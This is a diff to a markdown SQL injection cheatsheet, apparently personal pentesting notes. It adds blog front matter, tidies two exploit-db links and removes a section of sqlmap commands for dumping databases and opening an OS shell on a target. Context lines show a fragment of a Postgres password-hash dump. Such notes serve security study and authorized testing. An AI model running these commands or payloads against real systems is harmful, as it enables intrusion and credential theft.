@@ -1,3 +1,8 @@
+---
+layout: post
+title: SQL Injection
+description: SQLi Notes
+---
 # SQL Injection Cheatsheet
 
 Testing for Bypasses:&#x20;
@@ -61,24 +66,6 @@ Get data we are looking for: rolname and rolpassword
 
 postgres/md52d58e0637ec1e94cdfba3d1c26b67d01
 
-## SQLMAP
-
-### Copy POST request from burp and run with it
-
-`sqlmap -r request.txt --dbms=mysql --dump`
-
-### sqlmap crawl
-
-`sqlmap -u http://172.21.0.0 --crawl=1`
-
-### sqlmap dump database
-
-`sqlmap -u http://172.21.0.0 --dbms=mysql --dump`
-
-### sqlmap shell
-
-`sqlmap -u http://172.21.0.0 --dbms=mysql --os-shell`
-
 ## SQLI
 
 Testing for a row:
@@ -94,9 +81,9 @@ chema.columns where table_name='users'
 
 ## Links
 
-https://www.exploit-db.com/papers/12975&#x20;
+https://www.exploit-db.com/papers/12975
 
-https://www.exploit-db.com/papers/13045&#x20;
+https://www.exploit-db.com/papers/13045
 
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
 
